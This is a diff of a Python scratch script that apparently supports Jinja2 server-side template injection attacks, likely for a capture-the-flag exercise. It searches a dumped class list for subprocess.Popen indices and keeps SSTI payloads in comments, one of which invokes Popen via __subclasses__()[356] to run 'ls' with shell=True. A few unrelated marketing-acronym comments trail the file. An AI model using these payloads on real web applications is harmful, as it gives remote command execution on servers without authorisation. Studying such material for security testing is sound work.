@@ -3,14 +3,18 @@ s = "[<class 'type'>, <class 'weakref'>, <class 'weakcallableproxy'>, <class 'we
 import re
 c=0
 lt=[]
-gg=["type","subprocess.Popen","werkzeug.wsgi.ClosingIterator","zipp.Path","werkzeug.wsgi.FileWrapper","weakref",]
+gg=["type","subprocess.Popen"]
+gl=[0,138,139,494]
 for name in re.findall(r"<class '([^']+)'>", s):
-    if name in gg:
+    if name in gg or c in gl:
         lt.append((c,name))
-        print("XX",c,name,"XX")
+        print('='*30)
+        print(c,name)
+        print('-'*30)
     else:
         print(c,name)
     c+=1
+print('x'*40)
 print(lt)
 
     #if name == "subprocess.Popen"or name =="werkzeug.wsgi.ClosingIterator"or name =="werkzeug.wsgi.FileWrapper"or name =="weakref" or name =="type":
@@ -20,13 +24,13 @@ print(lt)
 
 #{{''.__class__.__mro__[1].__subclasses__()[300]}}
 #{{''.class.mro[1].subclasses()[356]('ls', shell=True, stdout=-1).communicate()}
-{{type(''.__class__.__mro__[1].__subclasses__()[356])}}
+#{{type(''.__class__.__mro__[1].__subclasses__()[356])}}
 #{{ type(''.__class__.__mro__[1].__subclasses__()[0]) }}
 
 
 
 
-{{''.__class__.__mro__[1].__subclasses__()[0][1][355][356]}}
+#{{''.__class__.__mro__[1].__subclasses__()[0][1][355][356]}}
 #AIDMA
 # Attention
 # Interest Impact
